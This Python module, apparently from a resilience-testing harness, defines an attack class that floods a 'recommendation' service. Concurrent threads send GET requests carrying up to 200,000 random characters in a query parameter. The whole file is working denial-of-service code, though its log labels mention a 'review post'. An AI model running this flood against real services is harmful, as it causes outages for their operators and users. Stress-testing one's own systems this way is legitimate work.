#!/usr/bin/env python3
import threading
import time
import logging
import random
import string
import requests


class Attack:
    """Oversized payload denial of service targeting the recommendation service."""

    VECTOR_NAME = "oversized_payload_dos"
    TARGET_SERVICE = "recommendation"
    RESOURCE_DIMENSIONS = ("memory", "cpu", "io")

    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.output_path = output_path
        self.test_identifier = test_identifier
        self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
        self.review_path = configuration.get("attack_recommendation_path") or "/recommendations"
        self.concurrency = int(float(configuration.get("attack_concurrency", 10)))
        self.timeout = float(configuration.get("attack_request_timeout_seconds", 10))
        size = int(float(configuration.get("attack_large_body_size_bytes", 2 * 1024 * 1024)))
        safe_size = max(512, min(size, 200000))
        alphabet = string.ascii_letters + string.digits
        self.large_hint = "".join(random.choices(alphabet, k=safe_size))
        self.context_tags = ["dis", "rate", "price"]
        burst = configuration.get("attack_recommendation_requests_per_worker")
        try:
            self.requests_per_worker = max(1, int(float(burst)))
        except (TypeError, ValueError):
            self.requests_per_worker = 3

    def worker(self, end_ts, stop_event):
        session = requests.Session()
        url = f"{self.base_url}{self.review_path}"
        while (time.time() < end_ts) and (not stop_event.is_set()):
            for _ in range(self.requests_per_worker):
                if (time.time() >= end_ts) or stop_event.is_set():
                    break
                try:
                    require = random.choice(self.context_tags)
                    lat = 38.0235 + (random.randint(0, 481) - 240.5) / 1000.0
                    lon = -122.095 + (random.randint(0, 325) - 157.0) / 1000.0
                    params = {
                        "require": require,
                        "lat": f"{lat:.4f}",
                        "lon": f"{lon:.4f}",
                        "context": self.large_hint,
                        "topk": str(random.randint(50, 100)),
                    }
                    session.get(url, params=params, timeout=self.timeout)
                except Exception:
                    pass

    def run(self, duration_seconds, stop_event):
        logging.info(
            "large_review_post: starting (target_service=%s, concurrency=%d, payload_hint_bytes=%d)",
            self.TARGET_SERVICE,
            self.concurrency,
            len(self.large_hint),
        )
        end_ts = time.time() + duration_seconds
        threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            remaining = max(0.0, end_ts - time.time())
            t.join(timeout=remaining)
        logging.info("large_review_post: finished")
